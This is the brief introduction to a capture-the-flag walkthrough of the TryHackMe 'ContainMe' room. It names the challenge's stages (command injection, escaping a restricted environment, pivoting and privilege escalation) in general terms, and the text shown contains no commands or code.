TryHackMe "ContainMe" – Full Walkthrough
This document provides a comprehensive step-by-step walkthrough of the ContainMe room on TryHackMe. The challenge involves exploiting a command injection vulnerability in a web application, escaping a restricted environment, pivoting to a second host, and performing privilege escalation to retrieve the final flag.

